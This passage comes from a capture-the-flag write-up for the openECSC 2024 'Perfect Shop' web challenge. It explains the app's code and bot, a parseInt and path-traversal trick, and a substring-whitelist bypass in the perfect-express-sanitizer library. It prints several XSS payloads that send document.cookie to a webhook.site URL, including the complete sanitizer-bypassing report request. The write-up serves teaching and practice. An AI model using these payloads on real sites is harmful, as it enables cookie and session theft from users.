+</span></span></code></pre></div><p>Given the password check, which is generated completely randomly, we could even ignore the code, as this is an endpoint impossible to trigger for regular users. The fact that the challenge is on a shared instance (all participants must solve the challenge on the same server) is already a big hint that we cannot modify the products as we please, potentially harming other participants. Imagine if someone could have the idea of giving RCE or this type of XSS on a shared instance :D</p>
+<p>For completeness: the id passed by the user is parsed into <code>id</code>. A check is made on the existence of the product and on the correctness of the password. If both pass, all fields that are not empty on the edit page are modified, and also the price if the integrity check is passed (it simply checks that the price is a valid non-negative float). If the modification is successful, a success message is displayed, and in any case, at the end, you are redirected to the edit page.</p>
+<h4 id="report">Report<a hidden class="anchor" aria-hidden="true" href="#report">#</a></h4>
+<h5 id="get-1">GET<a hidden class="anchor" aria-hidden="true" href="#get-1">#</a></h5>
+<p>Simply renders the report page.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/report.png" alt="Report page"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;report&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>It&rsquo;s possible to see how the list of products serves the report page to allow the user to choose the product for which to file a complaint in the drop-down list.</p>
+<h5 id="post-1">POST<a hidden class="anchor" aria-hidden="true" href="#post-1">#</a></h5>
+<p>User reporting action.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">id</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isNaN(<span style="color:#a6e22e">id</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">products</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid product ID&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;report&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">HEADLESS_HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span>, { 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>, <span style="color:#e6db74">&#39;X-Auth&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">HEADLESS_AUTH</span> },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">actions</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;request&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">WEB_DOM</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span>,
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;set-cookie&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;flag&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">FLAG</span>
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;request&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">WEB_DOM</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/product/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;sleep&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;time&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>         })
+</span></span><span style="display:flex;"><span>    }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Report submission failed, contact an admin if the problem persists&#39;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">successmsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Report submitted successfully&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;report&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>    }).<span style="color:#66d9ef">catch</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">errormsg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Failed to submit report, contact an admin if the problem persists&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;report&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><h5 id="headless-bot-verification">Headless Bot Verification<a hidden class="anchor" aria-hidden="true" href="#headless-bot-verification">#</a></h5>
+<p>At the outset, after parsing and checking the existence of the product as seen before, a <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">fetch</a> to a headless is performed.</p>
+<p>While this might seem overwhelming, the functioning of the headless is straightforward:</p>
+<p>The fetch visits the site indicated in the constant <code>HEADLESS_HOST</code>, which cannot be known unless the application&rsquo;s configurations are known.</p>
+<p>At this address, a <code>POST</code> is made, with headers indicating to the headless that it is about to receive data in <a href="https://en.wikipedia.org/wiki/JSON">JSON format</a>.</p>
+<p>Since the source code of the headless is not available, the exact mechanism behind the implementation of <code>actions</code> cannot be determined precisely. However, it is sufficient to know that there are instructions being executed sequentially, for the scope of the challenge.</p>
+<p>The succession of <code>actions</code> is as follows:</p>
+<ul>
+<li>A GET request is made to the Perfect Shop, to allow the next step;</li>
+<li>A <code>flag</code> cookie related to the Perfect Shop is set, with the value being the flag to be extracted to solve the challenge;</li>
+<li>A GET request is made to <code>http://${WEB_DOM}/product/${req.body.id}</code>, where <code>WEB_DOM</code> is the address of the Perfect Shop, and <code>req.body.id</code> is the id passed by the user during the reporting process;</li>
+<li>Nothing is done for one second.</li>
+</ul>
+<p>After this, various error and success cases are handled. Two different messages are printed based on whether the error is detected by the challenge server&rsquo;s JavaScript code, or if a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">status code</a> other than 200 is returned by the headless.</p>
+<p>In essence, the user&rsquo;s report is being verified by a bot, simulating the behavior of a logged-in admin who presumably has session/authentication cookies related to the Shop and who checks the product with the id indicated by the user at the time of the report.</p>
+<h2 id="setup">Setup<a hidden class="anchor" aria-hidden="true" href="#setup">#</a></h2>
+<p>Having the challenge running locally greatly facilitates the process of understanding every tiny part of the application being attacked. In this case, the organizers have also delivered the source code with well-crafted Docker Compose files that allow setting up the infrastructure in a breeze.</p>
+<h3 id="docker">Docker<a hidden class="anchor" aria-hidden="true" href="#docker">#</a></h3>
+<p><a href="https://www.docker.com/">Docker</a> enables the creation of &ldquo;magic boxes&rdquo; (containers) containing certain software that can be executed as if it were running on the developer&rsquo;s computer.</p>
+<p>This means that developers can distribute infrastructures based on specific operating systems and configurations without requiring users to switch to such OS or modify their configurations.</p>
+<h3 id="docker-compose">Docker Compose<a hidden class="anchor" aria-hidden="true" href="#docker-compose">#</a></h3>
+<p>An application might require multiple containers, envisioning a site with a dedicated server for the web engine and another for the database (as in this challenge).</p>
+<p><a href="https://docs.docker.com/compose/">Docker Compose</a> files are like maps that aid in the coordinated management of different logically linked containers. They specify which containers need to be started simultaneously with a single command, along with information about them such as the values of their environment variables, the ports they can use, their dependencies, etc.</p>
+<p>Receiving well-crafted Docker Compose files along with the source code of the challenge means being able to easily test locally with a single command and modify the code as needed to better understand the limits of our payloads and the nature of the vulnerabilities of the site being attacked.</p>
+<h3 id="this-challenge">This Challenge<a hidden class="anchor" aria-hidden="true" href="#this-challenge">#</a></h3>
+<h4 id="linux">Linux<a hidden class="anchor" aria-hidden="true" href="#linux">#</a></h4>
+<p>To simply run the challenge, just execute <code>sudo docker compose up</code> in the challenge folder to start all the containers. As indicated in both <code>server.js</code> and the <code>docker-compose.yaml</code> file, the site will be accessible on <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> 3000.</p>
+<p>If for any reason you need to modify the source code of the challenge, simply make the desired changes, save the file, and then run <code>sudo docker compose build web</code>. In this case, specifying <code>web</code> indicates that only the container related to the web server should be rebuilt, rather than all containers.</p>
+<h4 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h4>
+<p>Start the Docker Engine. If you have Docker Desktop, simply launch it, and the Engine will start automatically. From the terminal, navigate to the Perfect Shop folder and execute <code>docker compose up</code> to start the challenge locally, and <code>docker compose build web</code> if you wish to apply any changes. Similarly, specifying <code>web</code> indicates that only the container related to the web server should be rebuilt, rather than all containers.</p>
+<h2 id="how-to-attack">How to Attack?<a hidden class="anchor" aria-hidden="true" href="#how-to-attack">#</a></h2>
+<p>The presence of a bot effectively guarantees that we&rsquo;ll need to exploit a <a href="https://owasp.org/www-project-top-10-client-side-security-risks/">client-side vulnerability</a>, as clearly confirmed by the presence of an XSS filter.</p>
+<p>There are three things that might raise eyebrows when conducting a static code analysis (I didn&rsquo;t notice two of these during the competition):</p>
+<ul>
+<li>The entire input is being parsed and not <a href="https://en.wikipedia.org/wiki/Type_conversion">casted</a>, which means the parsed value and the unparsed value could be logically very different;</li>
+<li>The only endpoint exempt from input sanitization is <code>/admin</code>, but some HTML tags could also be found in <code>/admin/:id</code> (they are different endpoints);</li>
+<li>During the reporting phase, the report itself is related to the product with the parsed ID passed by the user, but the bot visits the product endpoint with the unparsed ID passed by the user. Connecting back to the first point, the values could be completely different from each other;</li>
+</ul>
+<h4 id="parsing">Parsing<a hidden class="anchor" aria-hidden="true" href="#parsing">#</a></h4>
+<p>The ID is parsed using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt">parseInt()</a> function. As stated in the documentation, the only requirement for a string to be parsed as an integer is that it <em>starts</em> with a digit. But what happens if a string starts with a digit but contains other characters and symbols?</p>
+<p><em>The console of major browsers&rsquo; DevTools is a great friend in this type of challenge. It can usually be accessed with fn+F12 &gt; console</em></p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/parseInt.png" alt="Example of parseInt function behavior"  />
+ Hell yeah.</p>
+<p>Simply put, the rest of the string is brutally truncated. The same goes if there are digits before, then characters, and then more digits. From the first encountered character onwards, everything is completely ignored by parseInt.</p>
+<h4 id="endpoint-inheritance-its-not-a-real-thing-dont-look-it-up">Endpoint inheritance???? (It&rsquo;s not a real thing don&rsquo;t look it up)<a hidden class="anchor" aria-hidden="true" href="#endpoint-inheritance-its-not-a-real-thing-dont-look-it-up">#</a></h4>
+<p>As visible from the screenshot shown earlier, there are tags in <code>/admin/:id</code>, despite only <code>/admin</code> being excluded from sanitization. At this point, the only option is to delve into the sanitizer&rsquo;s workings, which in this case is imported from the <a href="https://github.com/pariazar/perfect-express-sanitizer/tree/4f9c47f37596fa9830408470d818752d76b0dd79"><code>perfect-express-sanitizer</code></a> library. Specifically, in the challenge, version <code>1.0.13</code> was being used.</p>
+<p>There are several modules related to sanitization, while <code>index.js</code> is the file responsible for managing the whitelist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sanitize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./modules/&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">middleware</span>(
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {},
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">whiteList</span> <span style="color:#f92672">=</span> [],
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">only</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;body&#34;</span>, <span style="color:#e6db74">&#34;params&#34;</span>, <span style="color:#e6db74">&#34;headers&#34;</span>, <span style="color:#e6db74">&#34;query&#34;</span>]
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">only</span>.<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">k</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>[<span style="color:#a6e22e">k</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">whiteList</span>.<span style="color:#a6e22e">some</span>((<span style="color:#a6e22e">v</span>) =&gt; <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">trim</span>().<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">v</span>))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>[<span style="color:#a6e22e">k</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitize</span>.<span style="color:#a6e22e">prepareSanitize</span>(<span style="color:#a6e22e">req</span>[<span style="color:#a6e22e">k</span>], <span style="color:#a6e22e">options</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clean</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">middleware</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sanitize</span>,
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The portion of code responsible for managing the whitelist is present in the if statement: <code>!whiteList.some((v) =&gt; req.url.trim().includes(v))</code>. The sanitization inside the if statement is only executed if the URL passed in the request does not <strong>include</strong> elements present in the whitelist. In particular, the use of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/some"><code>some()</code></a> allows checking if even a single element of the whitelist is present in the URL, in which case the condition becomes true, while <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/trim"><code>trim()</code></a> removes any spaces present at the beginning and end of the request URL.</p>
+<p>This means that just as <code>/admin</code> is excluded from sanitization, so is <code>/admin/:id</code>.</p>
+<p>It&rsquo;s quiz time!!! From which of these elements can a URL be composed?</p>
+<ul>
+<li><input disabled="" type="checkbox"> host</li>
+<li><input disabled="" type="checkbox"> path</li>
+<li><input disabled="" type="checkbox"> querystring (query parameters)</li>
+<li><input checked="" disabled="" type="checkbox"> all of the above</li>
+</ul>
+<p>Correct answer! You&rsquo;re really good ^^</p>
+<p>Armed with this information, we can move on to the next point.</p>
+<h4 id="traveling-bot">Traveling Bot<a hidden class="anchor" aria-hidden="true" href="#traveling-bot">#</a></h4>
+<p>Yes, there is a discrepancy between the parsed id and the id of the product that will be visited by the bot, but what does it change for us? Leading the bot to <code>http://perfectshop.challs.open.ecsc2024.it/product/1hehJHAHajhajseheja</code> instead of <code>http://perfectshop.challs.open.ecsc2024.it/product/1</code> as expected can be amusing, but nothing more.</p>
+<p>There is a powerful weapon that can be used in these cases, namely <a href="https://www.google.com/search?q=dot+dot+slash+meaning"><code>../</code></a>, which in a path means &ldquo;go up one folder&rdquo;. The same can apply to an endpoint: <code>http://perfectshop.challs.open.ecsc2024.it</code> is equivalent to <code>http://perfectshop.challs.open.ecsc2024.it/product/1/../../</code> (if the concept is not clear, I suggest playing around with it).</p>
+<p>This means that we can send the bot around. In itself, it&rsquo;s not a big deal, but by combining this with the other points mentioned, it&rsquo;s already possible to imagine a chain to create a working exploit, at least on paper. If that&rsquo;s not the case, you&rsquo;re just like me, and it might be useful to proceed by reading&hellip;</p>
+<h3 id="studying-the-target-by-playing-around">Studying the target by playing around<a hidden class="anchor" aria-hidden="true" href="#studying-the-target-by-playing-around">#</a></h3>
+<p><a href="https://en.wikipedia.org/wiki/Fuzzing">Fuzzing</a> is the art of experimenting and finding out, a technique proven by numerous cybersecurity experts, papers on the subject, and CTFers.</p>
+<p>Together with desperation, food, and time constraints, it has been the most useful thing for solving this challenge.</p>
+<p>Jokes aside, initially, I didn&rsquo;t notice almost anything of what I&rsquo;ve written so far in this writeup, and knowing my tendency to quickly abandon a challenge that I initially define as &ldquo;difficult&rdquo;, I decided to try a new approach.</p>
+<p>I tend to overlook various things during the exploration of a challenge, so having access to the source code and the Dockerfile, I decided to disable all filters and gradually re-enable them as I adapted the payload to the various constraints imposed on me.</p>
+<h4 id="first-step-reflected-xss-without-filters">First step: Reflected XSS without filters<a hidden class="anchor" aria-hidden="true" href="#first-step-reflected-xss-without-filters">#</a></h4>
+<p>In the <code>server.js</code> file, I edited the following lines:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/XSSfilterOFF.png" alt="Disabling XSS filter"  />
+</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/length_filterOFF.png" alt="Disabling input length filter"  />
+</p>
+<p>I decided to maintain decency on the length filter to avoid ending up with comically long payloads.</p>
+<p>At this point, all that&rsquo;s left is to build and deploy the challenge and see how it goes.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/FirstXSS.gif" alt="Example of injecting a simple XSS with filters disabled in the challenge"  />
+</p>
+<p>As expected, with the filters disabled, we can successfully exploit it. And steal a cookie?</p>
+<h5 id="cookie-stealing-and-webhooks">Cookie stealing and webhooks<a hidden class="anchor" aria-hidden="true" href="#cookie-stealing-and-webhooks">#</a></h5>
+<p>Cookies are a special type of header, and for this reason, there&rsquo;s a kind of shortcut in JavaScript that allows accessing them, namely the <code>document.cookie</code> property.</p>
+<p>To successfully exfiltrate a user&rsquo;s cookies on the website, you need an endpoint reachable by the victim, which means exposing a server to make it accessible to anyone.</p>
+<p><a href="https://en.wikipedia.org/wiki/Webhook">Webhooks</a> are&hellip; versatile things. For this challenge, a website like <a href="https://webhook.site/">webhook.site</a> allows using them as if you were using your own server exposed to the outside world.</p>
+<p>For a test, you can use a payload like this: <code>&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p>In this type of payload, it&rsquo;s important not to use a random HTML tag, but to ensure that JavaScript code is actually executed (it&rsquo;s okay to insert the webhook URL concatenated with <code>document.cookie</code> inside an <code>onerror</code>, but not in a simple <code>src</code>) so that <code>document.cookie</code> is &ldquo;reachable&rdquo;.</p>
+<p>Also, you need to append the cookies as query parameters (for webhook and personal server) or as a path (for a personal server only). Failing to do so means appending the cookies as part of the host, which means the request will never reach the desired destination. For example, instead of ending up at <code>myhost.com</code>, it would end up at <code>myhost.comCOOKIENAME=COOKIEVALUE</code>, which makes no sense, unlike <code>myhost.com?c=COOKIENAME=COOKIEVALUE</code> or <code>myhost.com/COOKIENAME=COOKIEVALUE</code> (which doesn&rsquo;t make sense with <code>webhook.site</code>, unless you own that domain).</p>
+<p>Executing the payload above by sending it to the search page yields the following result on webhook.site:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FirstWebhook.png" alt="Example webhook result"  />
+</p>
+<p>There are the cookies!</p>
+<h4 id="second-step-cookie-stealing-on-the-bot">Second step: Cookie stealing on the bot<a hidden class="anchor" aria-hidden="true" href="#second-step-cookie-stealing-on-the-bot">#</a></h4>
+<p>Perhaps it would have made more sense to find a valid payload with the character filter first, but during the competition, I was a bit panicked and wanted to make sure I could steal the bot&rsquo;s cookies without problems. Unfounded fear, as there was no kind of control in this regard, and the value of <a href="https://owasp.org/www-community/HttpOnly"><code>httpOnly</code></a> for the <code>flag</code> cookie wasn&rsquo;t specified, which means it will be set to the default value of <code>false</code>.</p>
+<p><em>What does this mean?</em> For security reasons, the optional <code>httpOnly</code> flag was introduced for cookies, which if set to <code>true</code>, prevents JavaScript code in the document from accessing <code>document.cookie</code>, mitigating exactly the type of attack I&rsquo;m about to perform.</p>
+<p>But first, let&rsquo;s delve into the bot&rsquo;s operation and the related report page.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/NetworkReport.png" alt="Inspection of a POST request to the reporting endpoint"  />
+</p>
+<p>All fine, here&rsquo;s the ID and the message. Checking the logs, which appear on the terminal from which the <code>docker compose</code> was launched, it&rsquo;s also possible to verify which page was visited by the bot:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotVisitsProduct.png" alt="Example of logs indicating that the bot visited the page related to the reported product"  />
+</p>
+<p>And if, for no reason, you wanted to send an ID different from those prefixed by the <code>select</code> proposed by the developer? In this case, it&rsquo;s very useful to modify the request with Burp Suite or similar tools. Unfortunately, I don&rsquo;t have the time to show you how to set up Burp on your trusted browser (<a href="https://www.youtube.com/watch?v=Vn_Zst6BMGo">this</a> tutorial may be helpful) or to show you the process to solve the challenge without using similar tools.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/BurpIDmodif.gif" alt="Modifying the product ID with Burp"  />
+</p>
+<p>What I did was change the value of <code>id</code> from <code>1</code> to <code>1/../../search?q=Incredible</code> before it was sent to the server and consequently to the bot. To clarify, I would have achieved the same result if I had done this:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/HTMLmodif.png" alt="Modifying the product ID from client-side HTML"  />
+</p>
+<p>Checking the logs, it can be seen that the bot is redirected to <code>search?q=Incredible</code>:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotFallsForIt.png" alt="Bot log visiting the search page with the value entered by the reporter"  />
+</p>
+<p>A brief check of the site&rsquo;s route structure confirms this.</p>
+<p>Now all that&rsquo;s left is to try the payload that worked before to exfiltrate our cookie on the bot. Trying the payload <code>&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code>, you would notice that the complete URL being visited is <code>http://localhost:3000/search?q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code> or <code>http://perfectshop.challs.open.ecsc2024.it/search?q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code> depending on whether you are testing the challenge locally or on the competition server.</p>
+<p>This means that the same request must be made by the bot, which means making the same modification made before, combining it with the exploit already used:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/WePwnNoFilter.png" alt="Example of successful attack without filter"  />
+</p>
+<p>Of course, I&rsquo;m not URL-encoding the payload here just to make it easier to understand what&rsquo;s happening, but you viewers at home must remember to URL-encode properly &lt;3 (on Burp, CTRL+U highlighting the text to be URL-encoded):</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/UrlEncoding4profit.gif" alt="Example of URL-encoded payload"  />
+</p>
+<p>First, URL-encode for the query parameter value that the bot will send to the search endpoint, and then URL-encode for the entire payload that is about to be sent to the bot.</p>
+<p>Sending this payload, you&rsquo;ll receive a request on the webhook with the test flag set in the config:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FlagNoFilter.png" alt="Test flag sent on the webhook"  />
+</p>
+<h4 id="third-step-cookie-stealing-on-the-bot-with-the-sanitizer-active">Third step: Cookie stealing on the bot with the sanitizer active<a hidden class="anchor" aria-hidden="true" href="#third-step-cookie-stealing-on-the-bot-with-the-sanitizer-active">#</a></h4>
+<p>On line 16, let&rsquo;s modify the sanitizer again to set it as in the original application, then rebuild everything:</p>
+<p><code>app.use(sanitizer.clean({ xss: true }, [&quot;/admin&quot;]));</code></p>
+<p>Once the application is rebuilt, you&rsquo;ll notice that none of the payloads used previously will work anymore, being replaced instead by an empty string.</p>
+<p>In this step, there are very few tricks that can be done. To solve this problem, one had to notice the error present in the sanitizer library, and during the competition, it was a far-from-immediate step.</p>
+<p>Let&rsquo;s say that for any reason, whether you tried to enter an <code>/admin</code> in the request as a query parameter, or during static analysis, you noticed that something was wrong with the sanitizer, now it&rsquo;s known that if <code>/admin</code> is a substring of the request URL (remember once again: query parameters are part of the URL), it will cause the sanitizer to ignore any type of XSS payload that is sent.</p>
+<p>One very convenient thing is that if you decide to insert an unused query parameter in the request, it will simply be sent to the server and not used. This means that you can send a completely random parameter with the value <code>/admin</code> to skip any kind of sanitization without having to modify the payload in some convoluted way.</p>
+<p>So, if before in the reporting phase you sent <code>id=1/../../search?q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;&amp;message=openECSC</code>, now you can send something similar to <code>id=1/../../search?lol=/admin&amp;q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;&amp;message=/admin</code>.</p>
+<p>Note how I had to use one <code>/admin</code> to bypass the filter when communicating with the bot and another to bypass the filter when tricking the bot into performing a search in the related endpoint.</p>
